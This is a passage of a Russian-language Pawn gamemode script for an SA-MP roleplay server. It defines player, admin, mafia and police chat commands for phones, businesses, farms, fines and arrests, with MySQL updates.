			Phone[playerid] = false;
			SendClientMessage(playerid, COLOR_WHITE, "Вы выключили телефон");
			format(totalstring, 90, "%s выключил телефон", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Вы включили телефон");
			Phone[playerid] = true;
			format(totalstring, 90, "%s включил телефон", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:number(playerid, params[]) return SendClientMessage(playerid, COLOR_GREY, "Узнать номер игрока: /phone [id игрока]");
CMD:phone(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pPhone][2] == 0) return SendClientMessage(playerid, COLOR_GREY, "У вас нет телефонной книжки!");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /phone [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pPhone][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не владеет телефоном!");
	SendMes(playerid, COLOR_WHITE, "%s - Телефон: %i",sendername(params[0]), PlayerInfo[params[0]][pPhone][1]);
	return true;
}

CMD:bpanel(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");
	format(totalstring, 256, "1. Информация о бизнесе\n2. Открыть бизнес\n3. Установить цену за товар\n4. Установить цену за вход\t[Вразработке]\n{FF6347}5. Продать бизнес");
	ShowPlayerDialog(playerid, D_HEAL+10, 2, "Панель управления бизнесом", totalstring, "Принять", "Отмена");
	return true;
}
CMD:setbizprod(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setbizprod [кол.во продуктов]");
	for(new idx = 1; idx <= TOTALBIZZ; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 4.0, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]))
		{
			BizzInfo[idx][bProduct] = params[0];
			SetBizzInt(idx, "product", params[0]);
			SendMes(playerid, COLOR_WHITE, "Вы заменили бизнесу %s продуктов на %d",BizzInfo[idx][bName], BizzInfo[idx][bProduct]);
		}
	}
	return true;
}
CMD:setnewjobs(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setnewjobs [кол.во]");
	Patronbox = params[0];
	Metall = params[0];
	Zavodz = params[0];
	SendMes(playerid, COLOR_WHITE, "Успешно выполнено!");
    SaveShahta();
    SetTimer("UpdateShaht",100,false);
	return true;
}
CMD:setmat(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setmats [кол.во]");
	Mats[0] = params[0];
	Mats[1] = params[0];
	Mats[2] = params[0];
	Mats[4] = params[0];
	Mats[5] = params[0];
	Mats[6] = params[0];
	Mats[7] = params[0];
	Mats[8] = params[0];
	Mats[9] = params[0];
	SendMes(playerid, COLOR_WHITE, "Успешно выполнено!");
	return true;
}
CMD:setbizprice(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setbizprice [стоимость]");
	for(new idx = 1; idx <= TOTALBIZZ; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 4.0, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]))
		{
			BizzInfo[idx][bPrice] = params[0];
			SetBizzInt(idx, "price", params[0]);
			SendMes(playerid, COLOR_WHITE, "Вы заменили бизнесу %s стоимость на %d",BizzInfo[idx][bName], BizzInfo[idx][bPrice]);
		}
	}
	return true;
}

CMD:setbizbank(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setbizprice [стоимость]");
	for(new idx = 1; idx <= TOTALBIZZ; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 4.0, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]))
		{
			BizzInfo[idx][bMoney] = params[0];
			SetBizzInt(idx, "money", params[0]);
			SendMes(playerid, COLOR_WHITE, "Вы заменили бизнесу %s баланс на %d",BizzInfo[idx][bName], BizzInfo[idx][bMoney]);
		}
	}
	return true;
}

CMD:setbizname(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] == 0) return true;
	if(sscanf(params, "s", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setbizname [новое имя]");
	for(new idx = 1; idx <= TOTALBIZZ; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 4.0, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]))
		{
			format(BizzInfo[idx][bName],32,params[0]);
			SetBizzStr(idx, "name", params[0]);
			SendMes(playerid, COLOR_WHITE, "Вы заменили бизнесу %s имя",BizzInfo[idx][bName]);
		}
	}
	return true;
}

CMD:buybiz(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerBizz(playerid) == 1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже владеете бизнесом!");
	new full, full_;
	new string[256];
	for(new idx = 1; idx <= TOTALBIZZ; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]))
		{
			full++;
			if(!strcmp(BizzInfo[idx][bOwner],"None",true))
			{
				full_++;
				if(PlayerInfo[playerid][pCash] < GetInflationPrice(BizzInfo[idx][bPrice])) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
				else
				{
					PlayerInfo[playerid][pCash] -= GetInflationPrice(BizzInfo[idx][bPrice]);
					BizzInfo[idx][bBuyPrice] = GetInflationPrice(BizzInfo[idx][bPrice]);
					BizzInfo[idx][bProduct] = 0;
					BizzInfo[idx][bMoney] = GetInflationPrice(BizzInfo[idx][bPrice]);
					Exchequer+=GetInflationPrice(BizzInfo[idx][bPrice]);
					format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
					GameTextForPlayer(playerid, "The busines was bought", 3000, 5);
					SendMes(playerid, COLOR_WHITE, "Вы купили бизнес %s за %i долларов. У вас осталось: %i долларов",BizzInfo[idx][bName],BizzInfo[idx][bPrice], PlayerInfo[playerid][pCash]);
					SendClientMessage(playerid, COLOR_LIGHTRED, "Внимание! Не забывайте пополнять счет бизнеса");
					SendClientMessage(playerid, COLOR_LIGHTRED, "Внимание! Приобретите лицензию на ваш бизнес, если в течении 12 часов этого не будет, он будет продан государству!");
					SendClientMessage(playerid, COLOR_WHITE, "Помощь: Используйте /mm > Команды сервера > Бизнес");
					strmid(BizzInfo[idx][bOwner],PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
					format(string, sizeof(string), "UPDATE "TABLE_BIZZ" SET owner = '%s', buyprice = %i , product = %i, money = %i WHERE id = %d LIMIT 1", BizzInfo[idx][bOwner], BizzInfo[idx][bBuyPrice], BizzInfo[idx][bProduct],BizzInfo[idx][bMoney], idx);
					mysql_query(string);
					UpdateBizz(idx);
				}
			}
			else full_++;
		}
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится рядом с бизнесом!");
	if(full_ == 0) return SendClientMessage(playerid, COLOR_GREY, "Бизнес уже имеет владельца!");
	return true;
}

CMD:fpay(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!strcmp(FarmInfo[fOwner],PlayerInfo[playerid][pSendername],true) || !strcmp(FarmInfo[fZam],PlayerInfo[playerid][pSendername],true) || PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /fpay [стоимость сбора 1 куста]");
		if(params[0] > 150 || params[0] < 30) return SendClientMessage(playerid, COLOR_GREY, "Слот фермера 30 до 150!");
		FarmInfo[fPay] = params[0];
		SendMes(playerid, COLOR_GREY, "Вы успешно поставили цену за 1 куст: %d$!",FarmInfo[fPay]);
		new string[64];
		format(string, 64, "UPDATE "TABLE_FARM" SET fPay = %d", params[0]);
		mysql_query(string);
	}
	return true;
}

CMD:farmcmd(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!IsAFarmer(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "Вы не работаете фермером!");
	SendClientMessage(playerid, COLOR_GREY, "ВЛАДЕЛЕЦ & ЗАМЕСТИТЕЛЬ: /setfarmer /fpay /sellfarm /setfzam /finfo");
	SendClientMessage(playerid, COLOR_GREY, "ФЕРМЕРЫ: /fload /funload /finfo");
	return true;
}

CMD:setfarmer(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!strcmp(FarmInfo[fOwner],PlayerInfo[playerid][pSendername],true) || !strcmp(FarmInfo[fZam],PlayerInfo[playerid][pSendername],true) || PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setfarmer [id игрока] [слот фермера 1-6]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(params[1] > 4 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Слот фермера от 1 до 4!");
		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы указали себя!");
		new string[120];
		if(params[1] == 1)
		{
			format(FarmInfo[fFarmer1],MAX_PLAYER_NAME, "%s", sendername(params[0]));
			format(string, 128, "UPDATE "TABLE_FARM" SET fFarmer1 = '%s'", sendername(params[0]));
			mysql_query(string);

		}
		if(params[1] == 2)
		{
			format(FarmInfo[fFarmer2],MAX_PLAYER_NAME, "%s", sendername(params[0]));
			format(string, 128, "UPDATE "TABLE_FARM" SET fFarmer2 = '%s'", sendername(params[0]));
			mysql_query(string);
		}
		if(params[1] == 3)
		{
			format(FarmInfo[fFarmer3],MAX_PLAYER_NAME, "%s", sendername(params[0]));
			format(string, 128, "UPDATE "TABLE_FARM" SET fFarmer3 = '%s'", sendername(params[0]));
			mysql_query(string);
		}
		if(params[1] == 4)
		{
			format(FarmInfo[fFarmer4],MAX_PLAYER_NAME, "%s", sendername(params[0]));
			format(string, 128, "UPDATE "TABLE_FARM" SET fFarmer4 = '%s'", sendername(params[0]));
			mysql_query(string);
		}
		SendMes(playerid, COLOR_ORANGE, "Вы приняли %s фермером № %d", sendername(params[0]),params[1]);
		SendClientMessage(params[0], COLOR_GREEN, "===============[УВЕДОМЛЕНИЕ]================ ");
		SendMes(params[0], COLOR_WHITE, "  Основатель фермы: %s принял вас фермером", PlayerInfo[playerid][pSendername]);
	}
	return true;
}

CMD:setfzam(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!strcmp(FarmInfo[fOwner],PlayerInfo[playerid][pSendername],true) || PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setfzam [id игрока] [1/назначить]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(params[1] > 1 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Слот от 1 до 0!");
		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы указали себя!");
		new string[100];
		if(params[1] == 1)
		{
			format(FarmInfo[fZam],MAX_PLAYER_NAME, "%s", sendername(params[0]));
			format(string, 128, "UPDATE "TABLE_FARM" SET fZam = '%s'", sendername(params[0]));
			mysql_query(string);

		}
		SendMes(playerid, COLOR_ORANGE, "Вы приняли %s на должность зама фермы.", sendername(params[0]));
		SendClientMessage(params[0], COLOR_GREEN, "===============[УВЕДОМЛЕНИЕ]================ ");
		SendMes(params[0], COLOR_WHITE, "  Основатель фермы: %s принял вас замом", PlayerInfo[playerid][pSendername]);
	}
	return true;
}

CMD:finfo(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 6.0, -379.2567,-1438.1407,25.7266))
	{
		new string[256];
		format(string,256,"\tФерма: %s\n\n\nСтоимость:\t\t%d\nВладелец:\t\t%s\nЗам:\t\t\t%s\nУрожай:\t\t%d\nФермер [1]:\t\t%s\nФермер [2]:\t\t%s\nФермер [3]:\t\t%s\nФермер [4]:\t\t%s"
		,FarmInfo[fName],FarmInfo[fPrice],FarmInfo[fOwner],FarmInfo[fZam],FarmInfo[fSeeds],FarmInfo[fFarmer1],FarmInfo[fFarmer2],FarmInfo[fFarmer3],FarmInfo[fFarmer4]);
		ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX,"Информация о ферме",string,"Закрыть","");
	}
	return true;
}

CMD:buyfarm(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[128];
	if(IsPlayerInRangeOfPoint(playerid, 5.0, -382.1395,-1438.7511,25.7266))
	{
		if(!strcmp(FarmInfo[fOwner],"None",true))
		{
			if(PlayerInfo[playerid][pCash] < FarmInfo[fPrice]) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
			else
			{
				PlayerInfo[playerid][pCash] -= FarmInfo[fPrice];
				FarmInfo[fSeeds] = 100;
				FarmInfo[fMoney] = FarmInfo[fPrice];
				GameTextForPlayer(playerid, "~r~-500000", 2000, 5);
				SendMes(playerid, COLOR_WHITE, "Вы купили ферму за %i долларов. У вас осталось: %i долларов",FarmInfo[fPrice], PlayerInfo[playerid][pCash]);
				SendClientMessage(playerid, COLOR_LIGHTRED, "Внимание! Ухаживайте за фермой, приглашайте игроков! Команды: /farmcmd");
				strmid(FarmInfo[fOwner],PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
				format(string, sizeof(string), "UPDATE "TABLE_FARM" SET fOwner = '%s', fMoney = %i , fSeeds = %i WHERE id = %d LIMIT 1", FarmInfo[fOwner], FarmInfo[fMoney], FarmInfo[fSeeds], 1);
				mysql_query(string);
				Delete3DTextLabel(FarmInfo[fText]);
				if(!strcmp(FarmInfo[fOwner],"None",true))
				{
					format(string, 64, "Ферма: %s\nСтоимость: 500000\nДля покупки введите /buyfarm", FarmInfo[fName]);
					FarmInfo[fText] = Create3DTextLabel(string,COLOR_WHITE,-382.4549,-1438.7761,25.7474,20.0,0,1);
				}
				else
				{
					format(string, 64, "Ферма: %s\nВладелец фермы: %s %s", FarmInfo[fName], FarmInfo[fOwner]);
					FarmInfo[fText] = Create3DTextLabel(string,COLOR_WHITE,-382.4549,-1438.7761,25.7474,20.0,0,1);
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_LIGHTRED, "У фермы уже есть свой владелец!");
		}
	}
	return true;
}

CMD:hpanel(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome);
	new i = GetPVarInt(playerid, "PlayerHouse");
	if(strcmp(PlayerInfo[playerid][pSendername],HouseInfo[i][hOwner],true) == 0)
	{
       if(!IsPlayerInRangeOfPoint(playerid, 60.0, HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz])) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInHome);
	   format(totalstring, 256, "{ffffff}1. {33AA33}Открыть{ffffff} или {FF6347}Закрыть {ffffff}дом\n2. Гардероб\n{ffffff}3. Баланс дом. счета\n4. Аптечеки\n{FF6347}5. Продать дом{ffffff}\n6. Доставить транспорт к дому[750$]");
	   ShowPlayerDialog(playerid, D_HOME, 2, "Панель управления Домом", totalstring, "Принять", "Отмена");

	}
	return true;
}
CMD:dpanel(playerid, params[])
{
    if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerDach(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome);
	new i = GetPVarInt(playerid, "PlayerDUCH");
  	if(strcmp(PlayerInfo[playerid][pSendername],HouseInfo[i][dOwner],true) == 0)
	{
		if(!IsPlayerInRangeOfPoint(playerid, 60.0, HouseInfo[i][dExitx], HouseInfo[i][dExity], HouseInfo[i][dExitz])) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится на вашей даче!");
		format(totalstring, 256, "{ffffff}[0] - {33AA33}Открыть{ffffff} или {FF6347}Закрыть {ffffff}дачу\n{ffffff}[1] - {FF6347}Продать дачу{ffffff}");
		ShowPlayerDialog(playerid, D_DACH+2, 2, "Панель управления Дачи", totalstring, "Принять", "Отмена");
	}
	return true;
}
CMD:getbizstats(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new full = 0;
	for(new i = 1; i <= TOTALBIZZ; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[i][bEntrx],BizzInfo[i][bEntry],BizzInfo[i][bEntrz]))
		{
			//if(!strcmp(BizzInfo[i][bOwner],"None",true)) return SendClientMessage(playerid, COLOR_GREY, "Бизнес не имеет владельца!");
			BizzStats(playerid, i);
			full++;
		}
	}
	if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться рядом с бизнесом!");
	return true;
}

CMD:bizlist(playerid, params[])
{
	if(IsAMafia(playerid))
	{
		SendClientMessage(playerid, COLOR_YELLOW2, "Завоеванные Бизнесы");
		for(new h = 0; h < MAX_BIZZ; h++)
		{
			new mafiapay = BizzPay[h] / 10;
			switch(PlayerInfo[playerid][pMember])
			{
			case F_RM:
				{
					if (BizzInfo[h][bMafia] == F_RM)
					{
						format(totalstring, 64, "- %s, Прибыль: %d",BizzInfo[h][bName],mafiapay);
						SendClientMessage(playerid, COLOR_YELLOW2, totalstring);
					}
				}
			case F_YAKUZA:
				{
					if (BizzInfo[h][bMafia] == F_YAKUZA)
					{
						format(totalstring, 64, "- %s, Прибыль: %d",BizzInfo[h][bName],mafiapay);
						SendClientMessage(playerid, COLOR_YELLOW2, totalstring);
					}
				}
			case F_LCN:
				{
					if (BizzInfo[h][bMafia] == F_LCN)
					{
						format(totalstring, 64, "- %s, Прибыль: %d",BizzInfo[h][bName],mafiapay);
						SendClientMessage(playerid, COLOR_YELLOW2, totalstring);
					}
				}
			}
		}
	}
	return true;
}
CMD:bizwar(playerid, params[])
{
	new factionm=0;
	new playerposed;
	if(PlayerInfo[playerid][pLeader] !=0){ factionm = PlayerInfo[playerid][pLeader];}
	else if(PlayerInfo[playerid][pMember] != 0 && PlayerInfo[playerid][pLeader] == 0) {factionm = PlayerInfo[playerid][pMember];}
	else {factionm = 0;}
	if(IsAMafia(playerid))
	{
		if(startwar == 1) return SendClientMessage(playerid, COLOR_WHITE, "Война уже начата!");
		if(FrakCDm[factionm] > 0) return SendClientMessage(playerid, COLOR_GREY, "Следующий захват возможен через час...");
		for(new h = 0; h < MAX_BIZZ; h++)
		{
			if(PlayerInfo[playerid][pMember] == F_LCN && PlayerInfo[playerid][pRank] >= 7 || PlayerInfo[playerid][pMember] == F_RM && PlayerInfo[playerid][pRank] >= 7 || PlayerInfo[playerid][pMember] == F_YAKUZA && PlayerInfo[playerid][pRank] >= 7)
			{
				if(IsPlayerInRangeOfPoint(playerid, 6.0, BizzInfo[h][bEntrx],BizzInfo[h][bEntry],BizzInfo[h][bEntrz]))
				{
					playerposed =1;
					if(BizzInfo[h][bMafia] == PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,COLOR_WHITE,"Бизнес принадлежит вам!");
					if(war > 0)
					{
						format(totalstring,64,"Войну можно начать через %d секунд(ы)",war);
						SendClientMessage(playerid,-1,totalstring);
						return true;
					}
					if(BizzInfo[h][bMafia] == 0)
					{
						BizzInfo[h][bMafia] = PlayerInfo[playerid][pMember];
						SendFMes(PlayerInfo[playerid][pMember], COLOR_WHITE, "[F] Ваша мафия захватила бизнес");
						SetBizzInt(h, "mafia", BizzInfo[h][bMafia]);
						return true;
					}
					if(BizzInfo[h][bMafia] > 0)
					{
						startwar = 1;
						format(totalstring,64,"%s назначил стрелу за %s мафии %d",PlayerInfo[playerid][pSendername],BizzInfo[h][bName],BizzInfo[h][bMafia]);
						SendFMes(PlayerInfo[playerid][pMember],COLOR_REDD,totalstring);
						format(totalstring,64,"-= Бизнес %s захватывает мафия %d =-",BizzInfo[h][bName],PlayerInfo[playerid][pMember]);
						SendFMes(BizzInfo[h][bMafia],COLOR_REDD,totalstring);
						SendFMes(BizzInfo[h][bMafia],COLOR_WHITE,"Место встречи - Заброшенный аэропорт");
						SendFMes(BizzInfo[h][bMafia],COLOR_WHITE,"У Вас есть 10 минуты, чтобы отбить бизнес...");
						BizzInfo[h][bZahvat] = 1;
						war = 1200;
						MZSafeTime[0] = 600;
						FrakCDm[factionm]  = 1800;
						MZInfo[0][mNapad] = PlayerInfo[playerid][pMember];
						MZInfo[0][mFrakVlad] = BizzInfo[h][bMafia];
						ZoneTimerm[0] = 130;
						ZoneOnBattlem[0] = 1;
						zons = GangZoneCreate(328.755706, 2412.644531, 448.755706, 2564.644531);
						GangZoneShowForAll(zons, COLOR_NEWS);
						GangZoneFlashForAll(zons,COLOR_RED);
					}
				}
			}
		}
		if(playerposed == 0) SendClientMessage(playerid,-1,"Вы находитесь далеко от бизнеса!");
	}
	return true;
}

CMD:su(playerid,params[])return cmd_suspect(playerid,params);
CMD:suspect(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid))
	{
		if(sscanf(params, "us", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /suspect [id игрока] [причина]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(PlayerInfo[params[0]][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок уже находиться в тюрьме!");
		if(IsACop(params[0]) || PlayerInfo[params[0]][pMember] == F_ARMY) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок полицейский/агент/военный!");
		if(PlayerInfo[playerid][pMember] != F_FBI && PlayerInfo[params[0]][pWanted] >= 3) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете дать более 3-ех звезд!");
		if(PlayerInfo[playerid][pMember] == F_FBI && PlayerInfo[params[0]][pWanted] >= 6) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете дать более 6-ти звезд!");
		PlayerInfo[params[0]][pWanted]++;
		if(PlayerInfo[params[0]][pWanted] - 1 == 0) PlayerInfo[params[0]][pWantedTime] = 1800 + random(300);
		SetPlayerWantedLevel(params[0],PlayerInfo[params[0]][pWanted]);
		SetPlayerCriminal(params[0], PlayerInfo[playerid][pSendername], params[1]);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:frisk(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_ARMY)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /frisk [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете обыскать себя!");
		if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		new ntext[16], mtext[16];
		if(PlayerInfo[params[0]][pMats] > 0) mtext = "Материалы"; else mtext = "Пусто";
		if(PlayerInfo[params[0]][pDrugs] > 0) ntext = "Наркотики"; else ntext = "Пусто";
		SendMes(playerid, COLOR_WHITE, "[ -------------- Имущество %s -------------- ]", sendername(params[0]));
		SendMes(playerid, COLOR_GREY, "- %s",(!PlayerInfo[params[0]][pPhone][2]) ? ("Телефонная книга") : ("Пусто"));
		SendMes(playerid, COLOR_GREY, "- %s", mtext);
		SendMes(playerid, COLOR_GREY, "- %s", ntext);
		format(totalstring, 80, "%s обыскал(а) %s'а", PlayerInfo[playerid][pSendername], sendername(params[0]));
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:ticket(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid))
	{
		if(sscanf(params, "uis", params[0], params[1], params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /ticket [id игрока] [сумма] [причина]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		if(params[1] < 1 || params[1] > 10000) return SendClientMessage(playerid, COLOR_GREY, "Штраф от 1$ до 10000$!");
		SendMes(playerid, 0x6495EDFF, "Вы выписали штраф в размере %d долларов %s'у. Причина: %s", params[1], sendername(params[0]), params[2]);
		SendMes(params[0], 0x6495EDFF, "Офицер %s выписал вам штраф в размере %d долларов. Причина: %s", PlayerInfo[playerid][pSendername], params[1], params[2]);
		SetPVarInt(params[0], "TicketPlayer", playerid);
		SetPVarInt(params[0], "TicketSumma", params[1]);
		format(totalstring, 127, "Офицер %s выписал вам штраф в размере %d вирт\nПричина: %s\n\nВы согласный оплатить?", PlayerInfo[playerid][pSendername], params[1], params[2]);
		ShowPlayerDialog(params[0], D_HEAL+2, 0, "Штраф",  totalstring, "Да", "Нет");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:main(playerid, params[]) return cmd_mm(playerid, params);
CMD:help(playerid, params[]) return cmd_mm(playerid, params);
CMD:menu(playerid, params[]) return cmd_mm(playerid, params);
CMD:stats(playerid, params[]) return cmd_mm(playerid, params);
CMD:an(playerid, params[]) return cmd_rr(playerid, params);
CMD:mm(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	ShowPlayerDialog(playerid, D_MAINMENU, 2, "Панель управления аккаунтом", "{FFFFFF}• {00FF00}Статистика персонажа{FFFFFF}\n• Жалоба/Вопрос\n• Настройки\n• Команды сервера\n• Сменить ник\n• Полезная информация\n• Радио "Namesitet"\n• Донат\n• Телефон", "Далее", "Закрыть");
	return true;}
CMD:putcar(playerid, params[]) return cmd_cput(playerid, params);
CMD:cput(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вам не доступна эта команда!");
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны быть в авто!");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /cput [id игрока]");
	new string[90];
	if(PlayerCuffed[params[0]] == false) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен быть в наручниках!");
	if(ProxDetectorS(4.0, playerid, params[0]))
	{
		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете затащить в автомобиль самого себя!");
		PutPlayerInVehicle(params[0], GetPlayerVehicleID(playerid), 3);
		format(string, 90, "%s затащил(а) в авто %s", PlayerInfo[playerid][pSendername], sendername(params[0]));
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Игрок не рядом с вами!");
	}
	return true;
}
CMD:pull(playerid, params[])
{
